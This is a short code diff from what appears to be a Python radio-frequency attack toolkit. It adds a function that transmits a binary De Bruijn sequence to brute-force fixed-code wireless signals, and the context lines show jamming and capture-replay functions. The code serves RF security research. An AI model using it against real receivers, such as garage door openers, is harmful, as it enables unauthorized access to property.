@@ -1,6 +1,6 @@
 
 import RFFunctions as tools
-import findDevices, jam
+import findDevices, jam, utilities
 import time, sys
 sys.dont_write_bytecode = True
 #-----------------Rolling Code-------------------------#
@@ -86,3 +86,18 @@ def replaySavedCapture(d, uploaded_payload):
                     tools.sendTransmission(payload ,d)
 
 #--------------- End Replay Saved Capture-------------------#
+
+
+#---------------Send DeBruijn Sequence Attack----------------------#
+# https://en.wikipedia.org/wiki/De_Bruijn_sequence
+def deBruijn(d):
+    '''Send Binary deBruijn payload to bruteforce a signal'''
+    response = raw_input( "What length deBruijn would you like to try: ")
+
+    binary = utilities.deBruijn(2, int(response))
+    payload = tools.turnToBytes(binary)
+    print('Sending ' +str(len(binary))+ ' bits length binary deBruijn payload formated to bytes')
+
+    tools.sendTransmission(payload ,d)
+
+#----------------- End DeBruijn Sequence Attack--------------------#
